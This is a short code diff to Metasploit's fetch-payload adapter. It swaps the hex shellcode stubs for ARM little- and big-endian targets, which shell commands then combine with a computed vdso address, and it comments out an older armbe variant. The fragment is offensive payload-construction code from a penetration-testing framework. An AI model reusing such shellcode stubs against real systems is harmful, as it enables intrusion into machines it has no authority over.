@@ -489,9 +489,10 @@ module Msf::Payload::Adapter::Fetch
     when 'aarch64'
       %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armle'
-      %^"e59f2008e12fff12"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"024a1047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armbe'
-      %^"08209fe512ff2fe1"$(echo $(printf %04x $vdso_addr))^
+      #%^"08209fe51047"$(echo $(printf %04x $vdso_addr))^
+      %^"e59f20084710"$(echo $(printf %04x $vdso_addr))^
     when 'mipsle'
       %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
     when 'mipsbe'
